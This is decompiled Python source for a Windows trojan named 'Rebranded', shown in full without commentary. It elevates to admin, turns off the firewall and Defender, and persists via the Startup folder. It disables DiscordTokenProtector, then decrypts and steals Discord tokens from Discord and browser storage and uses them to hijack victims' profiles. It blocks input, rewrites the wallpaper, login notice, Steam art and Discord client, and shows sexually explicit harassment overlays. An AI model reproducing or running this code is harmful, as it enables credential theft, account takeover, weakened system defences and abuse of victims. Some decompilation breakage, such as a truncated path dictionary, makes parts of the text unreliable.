# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: Rebranded.py
# Bytecode version: 3.10.0rc2 (3439)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

global TOK  # inserted
import sys
import os
import winreg
import vdf
import tkinter
from tkinter import *
import PIL
from PIL import Image, ImageOps, ImageDraw, ImageFont, ImageTk, ImageGrab
import json
import random
import shutil
from pynput.keyboard import Key, Controller
import time
import ctypes
from ctypes import *
import time
import threading
import customtkinter
import winreg
import re
import glob
import subprocess
import base64
import json
import zlib
import os
import platform
import codecs
import random
import re
import sqlite3
import subprocess
import sys
import getpass
import threading
import uuid
from shutil import copy2
from sys import argv
import zlib
pyobfuscate = ''
import urllib.request
from tempfile import gettempdir, mkdtemp
from zipfile import ZIP_DEFLATED, ZipFile
from tkinter import *
import psutil
import requests
import wmi
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from win32crypt import CryptUnprotectData
import requests
import tls_client
from tls_client import Session
import webbrowser
WS_EX_LAYERED = 524288
WS_EX_TRANSPARENT = 32
WS_EX_TOPMOST = 8
LWA_COLORKEY = 1
__STARTUP__ = False
__DEFENDER__ = False
TOK = []

def runmain():
    threads = [killprotector, startup, disable_defender]
    username = getpass.getuser()
    configcheck(threads)
    for func in threads:
        process = threading.Thread(target=func, daemon=True)
        process.start()
    for t in threading.enumerate():
        try:
            t.join()
        except RuntimeError:
            continue
    Discord()

def bmo():
    Debug()
    procs = [runmain]

def trygrab(func):
    def wrapper(*args, **kwargs):
        try:
            func(*args, **kwargs)
        except Exception:
            return None
    return wrapper

def configcheck(list):
    if not __STARTUP__:
        list.remove(startup)
    if not __DEFENDER__:
        list.remove(disable_defender)

def startup():
    startup_path = os.getenv('appdata') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
    if os.path.exists(startup_path + argv[0]):
        os.remove(startup_path + argv[0])
        copy2(argv[0], startup_path)
    else:  # inserted
        copy2(argv[0], startup_path)

def disable_defender():
    subprocess.call(['netsh', 'advfirewall', 'set', 'publicprofile', 'state', 'off'], shell=True, capture_output=True)
    subprocess.call(['netsh', 'advfirewall', 'set', 'privateprofile', 'state', 'off'], shell=True, capture_output=True)
    subprocess.call(['powershell.exe', '-ExecutionPolicy', 'Unrestricted', '-File', 'Disable-WindowsDefender.ps1'])

def killprotector():
    roaming = os.getenv('APPDATA')
    path = '{roaming}\\DiscordTokenProtector\\'
    config = path + 'config.json'
    if not os.path.exists(path):
        return
    for process in ['DiscordTokenProtector.exe', 'ProtectionPayload.dll', 'secure.dat']:
        try:
            os.remove(path + process)
        except FileNotFoundError:
            continue
    if os.path.exists(config):
        with open(config, errors='ignore') as f:
            try:
                item = json.load(f)
            except json.decoder.JSONDecodeError:
                return
            item['auto_start'] = False
            item['auto_start_discord'] = False
            item['integrity'] = False
            item['integrity_allowbetterdiscord'] = False
            item['integrity_checkexecutable'] = False
            item['integrity_checkhash'] = False
            item['integrity_checkmodule'] = False
            item['integrity_checkscripts'] = False
            item['integrity_checkresource'] = False
            item['integrity_redownloadhashes'] = False
            item['iterations_iv'] = 364
            item['iterations_key'] = 457
            item['version'] = 69420
        with open(config, 'w') as f:
            json.dump(item, f, indent=2, sort_keys=True)

class Discord:
    def __init__(self):
        self.baseurl = 'https://discord.com/api/v9/users/@me'
        self.appdata = os.getenv('localappdata')
        self.roaming = os.getenv('appdata')
        self.regex = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}'
        self.encrypted_regex = 'dQw4w9WgXcQ:[^\\\"]*'
        self.tokens_sent = []
        self.tokens = []
        self.ids = []
        self.grabTokens()
        self.upload()

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:(-16)].decode()
            return decrypted_pass
        except Exception:
            return 'Failed to decrypt password'

    def get_master_key(self, path):
        with open(path, 'r', encoding='utf-8') as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\', 'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\', 'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\', 'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\', 'Opera': self.appdata + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\', 'Opera GX': self.appdata + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\', 'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\', 'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\', 'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\', 'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\', 'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\', '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\', 'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\', 'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\', 'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\', 'Chrome': self.appdata +
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(' ', '').lower()
            if 'cord' in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[(-3):] not in ['log', 'ldb']:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(self.baseurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token})
                                    if r.status_code == 200:
                                        uid = r.json()['id']
                                        if uid not in self.ids:
                                            self.tokens.append(token)
                                            self.ids.append(uid)
                                except Exception:
                                    pass
                for file_name in os.listdir(path):
                    if file_name[(-3):] not in ['log', 'ldb']:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
                            except Exception:
                                pass
        if os.path.exists(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
            for path, _, files in os.walk(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
                            except Exception:
                                continue

    def upload(self):
        for token in self.tokens:
            if token in self.tokens_sent:
                pass
            TOK.append(token)
            self.tokens_sent += token

class Debug:
    global tempfolder  # inserted
    tempfolder = mkdtemp()

    def __init__(self):
        if self.checks():
            self.self_destruct()

    def check_process(self) -> bool:
        for proc in psutil.process_iter():
            if any((procstr in proc.name().lower() for procstr in self.blacklistedProcesses)):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        if sys.gettrace():
            sys.exit(0)

    def self_destruct(self) -> None:
        exit()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def fade_in(window, alpha):
    alpha = min(alpha + 0.1, 1.0)
    window.attributes('-alpha', alpha)
    if alpha < 1.0:
        window.after(30, fade_in, window, alpha)

def fade_out(window, alpha):
    alpha = max(alpha - 0.1, 0.0)
    window.attributes('-alpha', alpha)
    if alpha > 0.0:
        window.after(30, fade_out, window, alpha)
    else:  # inserted
        window.destroy()

def popup(img, T):
    root = Tk()
    root.geometry('667x900+800+300')
    root.overrideredirect(True)
    bg = PhotoImage(file=img)
    imageholder = Label(root, image=bg)
    imageholder.place(x=0, y=0, relwidth=1, relheight=1)
    root.after(T, lambda: root.destroy())
    fade_in(root, 0.0)
    root.after(T, lambda: fade_out(root, 1.0))
    root.mainloop()

def to_steamID3(steamID):
    ID64_BASE = 76561197960265728
    id_str = str(steamID)
    if id_str.isnumeric():
        offset_id = int(id_str) - ID64_BASE
        account_type = offset_id % 2
        account_id = (offset_id - account_type) // 2 + account_type
        out = ''
        return str(account_id * 2 - account_type)
    raise ValueError(f'Unable to decode steamID: {steamID}')

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath('.')
    return os.path.join(base_path, relative_path)

def read_reg(ep, p='', k=''):
    try:
        key = winreg.OpenKeyEx(ep, p)
        value = winreg.QueryValueEx(key, k)
        if key:
            winreg.CloseKey(key)
        return value[0]
    except Exception as e:
        return None

def find_install():
    Path1 = str(read_reg(ep=winreg.HKEY_LOCAL_MACHINE, p='SOFTWARE\\Wow6432Node\\Valve\\Steam', k='InstallPath'))
    Path2 = str(read_reg(ep=winreg.HKEY_LOCAL_MACHINE, p='SOFTWARE\\Valve\\Steam', k='InstallPath'))
    if not os.path.exists(Path1):
        Path1 = None
    if not os.path.exists(Path2):
        Path2 = None
    if Path1!= None:
        return Path1
    if Path2!= None:
        return Path2
    return ctypes.windll.user32.MessageBoxW(0, 'ERROR', 'Steam install Not Found', 4097)

def get_library():
    d = vdf.parse(open(find_install() + '\\config\\libraryfolders.vdf'))
    filtered = {}
    for key, value in d['libraryfolders'].items():
        libraryCount = f'{key}'
        filtered[libraryCount] = {'path': value['path'], 'apps': value['apps']}
    return filtered

def importjson():
    f = open(resource_path('api.steampowered.com.json'), encoding='utf8')
    data = json.load(f)
    f.close()
    d = {}
    for i in data['applist']['apps']:
        d[str(i['appid'])] = i['name']
    return d

def get_steam64():
    d = vdf.parse(open(find_install() + '\\config\\loginusers.vdf'))
    filtered = {}
    for key, value in d['users'].items():
        filtered = f'{key}'
    return filtered

def libpaths():
    dat = importjson()
    lib = get_library()
    keys_list = []
    for i in range(len(lib)):
        games = lib[str(i)]['apps']
        path = lib[str(i)]['path'] + '\\steamapps\\common'
        ids = list(games.keys())
        for k, v in dat.items():
            if k in ids:
                keys_list.append(k)
    return keys_list

def replace_images(target_folder, source_folder, predefined_names):
    if not os.path.exists(target_folder):
        os.makedirs(target_folder)
    source_files = [f for f in os.listdir(source_folder)]
    if not source_files:
        raise ValueError('No images found in the source folder')
    for predefined_name in predefined_names:
        source_file = random.choice(source_files)
        source_path = os.path.join(source_folder, source_file)
        target_file_name = str(predefined_name) + os.path.splitext(source_file)[1]
        target_path = os.path.join(target_folder, target_file_name)
        shutil.copy2(source_path, target_path)
        target_file_name = str(predefined_name) + 'p' + os.path.splitext(source_file)[1]
        target_path = os.path.join(target_folder, target_file_name)
        shutil.copy2(source_path, target_path)
        target_file_hero_name = str(predefined_name) + '_hero' + os.path.splitext(source_file)[1]
        target_hero_path = os.path.join(target_folder, target_file_hero_name)
        shutil.copy2(source_path, target_hero_path)
        with PIL.Image.open(target_hero_path) as img:
            img = img.resize((1920, 1200))
            img.save(target_hero_path)

def localconf(file_path):
    numbers_list = []
    with open(file_path, 'r', encoding='utf-8') as input_file:
        in_target_section = False
        target_section_depth = 0
        for line in input_file:
            line = line.strip()
            if not in_target_section:
                if line.startswith('\"Software\"'):
                    in_target_section = True
                    target_section_depth = line.count('{') - 1
            else:  # inserted
                target_section_depth += line.count('{') - line.count('}')
                if target_section_depth < 0:
                    break
                else:  # inserted
                    numbers = re.findall('\\b\\d{1,9}\\b', line)
                    numbers_list.extend(numbers)
        else:  # inserted
            return numbers_list
            return numbers_list
        return numbers_list

def appinfo(file_path):
    numbers = []
    try:
        with open(file_path, 'r', errors='ignore') as file:
            for line in file:
                try:
                    numbers_in_line = re.findall('\\d+', line)
                    numbers.extend(map(int, numbers_in_line))
                except Exception as e:
                    print(f'Error processing line: {line.strip()}. Error: {e}')
            return numbers
            return numbers
    except Exception as e:
        print(f'Error opening file: {file_path}. Error: {e}')
        pass
        return numbers

def copy_and_replace(source_file, destination_directory):
    filename = os.path.basename(source_file)
    destination_path = os.path.join(destination_directory, filename)
    if os.path.exists(destination_path):
        os.remove(destination_path)
    shutil.move(source_file, destination_path)

def steam():
    dirr = find_install() + '\\userdata\\' + to_steamID3(get_steam64())
    file_path = dirr + '\\config\\localconfig.vdf'
    localdata = []
    localdata = localconf(file_path)
    dic = importjson()
    games = libpaths()
    for i in range(len(localdata)):
        if str(localdata[i]) in dic:
            games.append(localdata[i])
    target_folder = find_install() + '\\userdata\\' + to_steamID3(get_steam64()) + '\\config\\grid'
    source_folder = 'resources\\gridimg'
    predefined_names = games
    replace_images(target_folder, source_folder, predefined_names)

def discordfun():
    ok = windll.user32.BlockInput(True)
    process_list = os.popen('tasklist').readlines()
    for process in process_list:
        if 'Discord' in process:
            pid = int(process.split()[1])
            os.system(f'taskkill /F /PID {pid}')
    time.sleep(0.2)
    os.startfile(resource_path('VencordInstallerCli.exe'))
    time.sleep(0.2)
    keyboard = Controller()
    for i in range(3):
        keyboard.press(Key.up)
        keyboard.release(Key.up)
        time.sleep(0.1)
    for i in range(3):
        keyboard.press(Key.enter)
        keyboard.release(Key.enter)
        time.sleep(0.3)
        print(i)
    pathsettings = os.getenv('APPDATA') + '\\Vencord\\settings'
    if not os.path.exists(pathsettings):
        os.makedirs(pathsettings)
    paththeme = os.getenv('APPDATA') + '\\Vencord\\themes'
    if not os.path.exists(paththeme):
        os.makedirs(paththeme)
    shutil.copyfile('resources\\discord\\BasicBackground.themeBase.css', resource_path('BasicBackground.theme.css'))
    copy_and_replace(resource_path('BasicBackground.theme.css'), paththeme)
    shutil.copyfile(resource_path('settingsbase.json'), resource_path('settings.json'))
    copy_and_replace(resource_path('settings.json'), pathsettings)
    ok = windll.user32.BlockInput(False)
    display_text_overlay('Try reopening discord <3', bg_color='hotpink', text_color='black')

def set_startup_message(title, message):
    reg_path = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, 'legalnoticecaption', 0, winreg.REG_SZ, title)
        winreg.SetValueEx(reg_key, 'legalnoticetext', 0, winreg.REG_SZ, message)
        winreg.CloseKey(reg_key)
        print('Startup message set successfully.')
    except Exception as e:
        print(f'An error occurred: {e}')

class OverlayWindow:
    def __init__(self, text):
        self.text = text
        self.current_text = ''
        self.root = tkinter.Tk()
        self.label = tkinter.Label(self.root, font=('Helvetica', 32), fg='white', bg='black')
        self.label.pack()
        self.setup_window()

    def setup_window(self, bg_color='black', text_color='white'):
        self.root.overrideredirect(True)
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        window_width = self.label.winfo_reqwidth()
        window_height = self.label.winfo_reqheight()
        position_right = int(screen_width / 2 - window_width / 2)
        position_down = int(screen_height / 2 - window_height / 2)
        self.root.geometry(f'+{int(0.6 * position_right)}+{position_down}')
        hwnd = ctypes.windll.user32.GetParent(self.root.winfo_id())
        style = ctypes.windll.user32.GetWindowLongW(hwnd, (-20))
        style |= WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST
        ctypes.windll.user32.SetWindowLongW(hwnd, (-20), style)
        ctypes.windll.user32.SetLayeredWindowAttributes(hwnd, 0, 200, LWA_COLORKEY)
        self.label.config(bg=bg_color, fg=text_color)

    def show(self):
        self.type_text(self.text)
        self.root.mainloop()

    def type_text(self, text_to_type):
        if len(text_to_type) > 0:
            self.current_text += text_to_type[0]
            self.label.config(text=self.current_text)
            self.root.after(180, self.type_text, text_to_type[1:])
        else:  # inserted
            self.root.after(2000, self.delete_text)

    def delete_text(self):
        if len(self.current_text) > 0:
            self.current_text = self.current_text[:(-1)]
            self.label.config(text=self.current_text)
            self.root.after(20, self.delete_text)
        else:  # inserted
            self.root.after(30, self.root.destroy)

def display_text_overlay(message, bg_color='black', text_color='white'):
    overlay = OverlayWindow(message)
    overlay.setup_window(bg_color, text_color)
    overlay.show()

class ImageDisplayApp:
    def __init__(self, root, image_folder, display_time=20, interval=0.3, total_time=20):
        self.root = root
        self.image_folder = image_folder
        self.display_time = display_time
        self.interval = interval
        self.total_time = total_time
        self.images = []
        self.image_labels = []
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.images_count = 0
        self.load_images()
        self.schedule_next_image()

    def load_images(self):
        for filename in os.listdir(self.image_folder):
            if filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                image_path = os.path.join(self.image_folder, filename)
                image = PIL.Image.open(image_path)
                self.images.append(ImageTk.PhotoImage(image))

    def show_random_image(self):
        image = random.choice(self.images)
        x = random.randint(0, self.root.winfo_screenwidth() - image.width())
        y = random.randint(0, self.root.winfo_screenheight() - image.height())
        window = Toplevel(self.root)
        window.overrideredirect(True)
        window.geometry(f'{image.width()}x{image.height()}+{x}+{y}')
        window.attributes('-topmost', True)
        label = Label(window, image=image, bd=0, highlightthickness=0)
        label.pack()
        with self.lock:
            self.image_labels.append(window)
            self.images_count += 1
        window.after(int(self.display_time * 1000), lambda: self.close_image_window(window))

    def schedule_next_image(self):
        if time.time() - self.start_time < self.total_time:
            self.show_random_image()
            self.root.after(int(self.interval * 1000), self.schedule_next_image)

    def close_image_window(self, window):
        with self.lock:
            if window in self.image_labels:
                self.image_labels.remove(window)
                self.images_count -= 1
                window.destroy()
        self.check_close_main()

    def check_close_main(self):
        with self.lock:
            if self.image_labels or time.time() - self.start_time >= self.total_time:
                self.root.quit()

def imgs():
    root = tkinter.Tk()
    root.overrideredirect(True)
    root.geometry('0x0+0+0')
    root.attributes('-alpha', 0.0)
    image_folder = 'resources\\gridimg'
    ImageDisplayApp(root, image_folder)
    root.mainloop()

def entry():
    popup(resource_path('FYNePn2XoAImIQb.png'), 5000)
    display_text_overlay('Thanks for letting me in~ ', bg_color='dimgrey', text_color='black')
    display_text_overlay('Feeling that rush~? \n not knowing what i\'ll do next <3', bg_color='dimgrey', text_color='black')
    display_text_overlay('..... Well~ lets just say~', bg_color='dimgrey', text_color='black')
    display_text_overlay('You\'re so fucked <3 ', bg_color='hotpink', text_color='black')
    display_text_overlay('You\'re *going* to be rebranded as my new cutie <3 \n How lucky are you~', bg_color='hotpink', text_color='black')
    display_text_overlay('just let me take over <3 ', bg_color='hotpink', text_color='black')
    display_text_overlay('Goood pet <3 ', bg_color='hotpink', text_color='black')
    display_text_overlay('Now.... PUMP FOR ME \n PUMP \n PUMP \n PUMP \n PUMP~ PUMP~ \n Nnnngnnfnnh <3 \n Lose control~', bg_color='hotpink', text_color='black')
    display_text_overlay('Gosh~ how i wish i were peeking through that webcam right now ;3', bg_color='hotpink', text_color='black')

def get_first_image_path(folder_path):
    files = os.listdir(folder_path)
    image_extensions = {'.gif', '.tiff', '.jpg', '.png', '.bmp', '.jpeg'}
    for file in files:
        _, ext = os.path.splitext(file)
        if ext.lower() in image_extensions:
            return os.path.join(folder_path, file)
    else:  # inserted
        return None

def setback():
    relative_path = 'resources\\win\\image'
    first_image_path = get_first_image_path(relative_path)
    absolute_path = os.path.abspath(first_image_path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, absolute_path, 0)

def update_profile(token, new_name, avatar_path):
    sesh = Session(client_identifier='chrome_115', random_tls_extension_order=True)
    headers = {'authority': 'discord.com', 'method': 'PATCH', 'scheme': 'https', 'accept': '*/*', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US', 'authorization': token, 'origin': 'https://discord.com', 'sec-ch-ua': '\"Not/A)Brand\";v=\"99\", \"Brave\";v=\"115\", \"Chromium\";v=\"115\"', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '\"Windows\"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'X-Debug-Options': 'bugReporterEnabled', 'X-Discord-Locale': 'en-US', 'Asia/Calcutta': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJkZXNpZ25faWQiOjB9', **{'X-Discord-Timezone': 'X-Discord-Timezone', 'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJkZXNpZ25faWQiOjB9'}}
    payload = {'avatar': f"data:image/jpeg;base64,{base64.b64encode(open(avatar_path, 'rb').read()).decode()}", 'global_name': new_name}
    r = sesh.patch('https://discord.com/api/v9/users/@me', json=payload, headers=headers)
    if r.status_code == 200:
        print('Profile changed successfully')
    else:  # inserted
        print(f'Failed to update profile: {r.status_code} - {r.json()}')

def explorer():
    cmd_file_path = 'resources\\win\\Register.cmd'
    subprocess.run(cmd_file_path, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
    time.sleep(0.3)
    keyboard = Controller()
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    time.sleep(0.3)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    time.sleep(0.3)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    time.sleep(0.3)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)

def disconnect_windows_session():
    if platform.system() == 'Windows':
        os.system('tsdiscon')
    else:  # inserted
        print('This function is only for Windows.')
if is_admin():
    popup(resource_path('FYNePn2XoAImIQb.png'), 5000)
    display_text_overlay('Thanks for letting me in~ ', bg_color='dimgrey', text_color='black')
    display_text_overlay('Feeling that rush~? \n not knowing what ill do next <3', bg_color='dimgrey', text_color='black')
    display_text_overlay('..... Well~ lets just say~', bg_color='dimgrey', text_color='black')
    display_text_overlay('You\'re so fucked <3 ', bg_color='hotpink', text_color='black')
    display_text_overlay('You\'re *going* to be rebranded as my new cutie <3', bg_color='hotpink', text_color='black')
    display_text_overlay('just let me take over <3 ', bg_color='hotpink', text_color='black')
    display_text_overlay('Goood pet <3 ', bg_color='hotpink', text_color='black')
    display_text_overlay('Now.... PUMP FOR ME \n PUMP \n PUMP \n PUMP \n PUMP~ PUMP~ \n Nnnngnnfnnh <3 \n Lose control~', bg_color='hotpink', text_color='black')
    display_text_overlay('Gosh~ \n how i wish i were peeking through that webcam right now ;3', bg_color='hotpink', text_color='black')
    display_text_overlay('Now~ \n im going to fuck \"your\" pc~', bg_color='hotpink', text_color='black')
    display_text_overlay('Lets see.... \n I know! ill start with windows <3', bg_color='hotpink', text_color='black')
    setback()
    display_text_overlay('Cute new background <3', bg_color='hotpink', text_color='black')
    set_startup_message('Your MINE now <3', 'Everytime you see this let me know how much you love being rebranded <3')
    display_text_overlay('Oh and i added another thing for you to figure out later <3', bg_color='hotpink', text_color='black')
    display_text_overlay('its gosh~ just~ soo soo hawwwt~?', bg_color='hotpink', text_color='black')
    display_text_overlay('Not knowing~ \n Not being able to resist~ \n And pumping to how weak it makes you <3', bg_color='hotpink', text_color='black')
    ok = windll.user32.BlockInput(True)
    display_text_overlay('Now you\'re reallly trappped with me <3', bg_color='hotpink', text_color='black')
    display_text_overlay('While you are nice and tied up~ \n lets go after file explorer next <3', bg_color='hotpink', text_color='black')
    explorer()
    display_text_overlay('All~ Done~ <3', bg_color='hotpink', text_color='black')
    ok = windll.user32.BlockInput(False)
    display_text_overlay('Ill take of the \"handcuffs\" off~ for now', bg_color='hotpink', text_color='black')
    display_text_overlay('and now~ ', bg_color='hotpink', text_color='black')
    display_text_overlay('lets fwakk that steam library <3', bg_color='hotpink', text_color='black')
    steam()
    display_text_overlay('mfn~ so hot right~? \n so hard to think~ \n just puuummpp~', bg_color='hotpink', text_color='black')
    display_text_overlay('More porn <3', bg_color='hotpink', text_color='black')
    discordfun()
    time.sleep(5)
    display_text_overlay('Almost there nhm~', bg_color='hotpink', text_color='black')
    imgs()
    runmain()
    new_username = 'Dumb Clickslut <3'
    avatar_image_path = get_first_image_path('resources\\discord\\pfp')
    for i in range(len(TOK)):
        discord_token = TOK[i]
        update_profile(discord_token, new_username, avatar_image_path)
    ctypes.windll.user32.MessageBoxW(0, 'ERROR', 'Virus Detected!', 4097)
    ctypes.windll.user32.MessageBoxW(0, 'ERROR', 'User Credentials Comprimised!', 4097)
    webbrowser.open('https://throne.com/bmo', new=2)
    disconnect_windows_session()
else:  # inserted
    ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, ' '.join(sys.argv), None, 1)